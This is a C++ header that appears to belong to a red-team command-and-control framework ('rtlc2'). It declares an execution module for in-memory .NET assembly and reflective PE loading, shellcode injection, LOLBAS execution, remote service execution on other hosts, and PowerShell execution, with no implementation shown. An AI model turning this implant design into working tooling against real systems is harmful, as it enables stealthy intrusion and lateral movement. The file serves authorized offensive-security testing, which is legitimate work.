#ifndef RTLC2_EXECUTION_H
#define RTLC2_EXECUTION_H

#include <string>
#include <vector>
#include <cstdint>

namespace rtlc2 {
namespace execution {

#ifdef RTLC2_WINDOWS

// Execute .NET assembly in-process via CLR hosting
struct AssemblyResult {
    bool success;
    std::string output;
    int exit_code;
};

AssemblyResult ExecuteAssembly(const std::vector<uint8_t>& assembly_data,
                               const std::string& arguments,
                               const std::string& runtime_version = "v4.0.30319");

// Reflective PE loader - load PE from memory
struct PEResult {
    bool success;
    std::string output;
    int exit_code;
};

PEResult ExecutePE(const std::vector<uint8_t>& pe_data,
                   const std::string& arguments,
                   bool fork_and_run = false);

// Inline shellcode execution
bool ExecuteShellcode(const uint8_t* shellcode, size_t size, bool new_thread = true);

// LOLBAS execution methods
std::string LOLBASExec(const std::string& method, const std::string& args);

// Service execution on remote host
bool SCExec(const std::string& target, const std::string& service_name,
            const std::string& binary_path);

#endif // RTLC2_WINDOWS

// Cross-platform shellcode execution
bool ExecuteShellcodeCrossPlatform(const uint8_t* shellcode, size_t size);

// PowerShell execution (cross-platform: CLR on Windows, pwsh on POSIX)
std::string ExecutePowerShell(const std::string& script);

} // namespace execution
} // namespace rtlc2

#endif // RTLC2_EXECUTION_H
